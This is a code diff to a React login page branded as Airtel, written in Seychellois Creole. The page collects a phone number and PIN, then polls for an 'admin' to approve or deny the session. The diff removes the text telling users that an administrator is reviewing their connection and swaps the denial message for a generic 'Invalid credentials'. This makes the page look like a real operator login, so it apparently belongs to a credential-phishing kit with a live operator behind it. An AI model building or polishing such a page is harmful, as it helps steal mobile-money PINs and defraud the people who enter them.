@@ -10,7 +10,7 @@ function AirtelLogin() {
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
   const [showPin, setShowPin] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [error, setError] = useState(''); // Added error state for denials
+  const [error, setError] = useState(''); 
   
   const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
   const [refId, setRefId] = useState<string | null>(null);
@@ -54,6 +54,8 @@ function AirtelLogin() {
 
     setError('');
     setIsLoading(true);
+    // IMMEDIATELY SHOW THE SPINNER OVERLAY
+    setIsWaitingForApproval(true); 
 
     const fullPhone = `${COUNTRY_CODE}${phone}`;
     localStorage.setItem('airtelPhone', fullPhone);
@@ -69,7 +71,6 @@ function AirtelLogin() {
 
       if (data.status === 'pending' && data.ref_id) {
         setRefId(data.ref_id);
-        setIsWaitingForApproval(true); 
         
         // Polling to check if admin approved or denied
         const pollInterval = setInterval(async () => {
@@ -88,7 +89,7 @@ function AirtelLogin() {
               // Reset the form when denied
               setPhone('');
               setPin(['', '', '', '']);
-              setError('Aprobasyon finn refize oubyen sesyon finn ekspire.');
+              setError('Kredans pa valid'); // "Invalid credentials" in Creole
             }
           } catch (pollErr) {
             console.error('Polling error:', pollErr);
@@ -99,6 +100,7 @@ function AirtelLogin() {
       }
     } catch (err) {
       console.error('Login request failed:', err);
+      setIsWaitingForApproval(false); // Hide spinner on network error
       setIsLoading(false);
       setError('Errer rezo. Tanpri esey ankor.');
     }
@@ -169,21 +171,7 @@ function AirtelLogin() {
           font-size: 22px;
           font-weight: 700;
           color: #1a1a1a;
-          margin-bottom: 20px;
           text-align: center;
-        }
-
-        .waiting-message {
-          background-color: #FEF2F2;
-          color: #4B5563;
-          padding: 16px 24px;
-          border-radius: 24px;
-          text-align: center;
-          font-size: 15px;
-          font-weight: 500;
-          line-height: 1.5;
-          max-width: 380px;
-          box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
 
         /* HEADER */
@@ -422,9 +410,6 @@ function AirtelLogin() {
         <div className="waiting-overlay">
           <div className="custom-spinner"></div>
           <div className="waiting-title">Aprobasyon an kour...</div>
-          <div className="waiting-message">
-            Nou pe atann ki administrasyon i aprouv ou koneksyon. Tanpri pa fèrm sa paj la...
-          </div>
         </div>
       )}
 
@@ -521,7 +506,7 @@ function AirtelLogin() {
               className={`login-btn ${isFormValid ? 'active' : ''}`}
               disabled={!isFormValid || isLoading || isWaitingForApproval}
             >
-              {isLoading && !isWaitingForApproval ? 'Pey konekte...' : 'Konekte'}
+              Konekte
               <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                 <line x1="5" y1="12" x2="19" y2="12" />
                 <polyline points="12 5 19 12 12 19" />
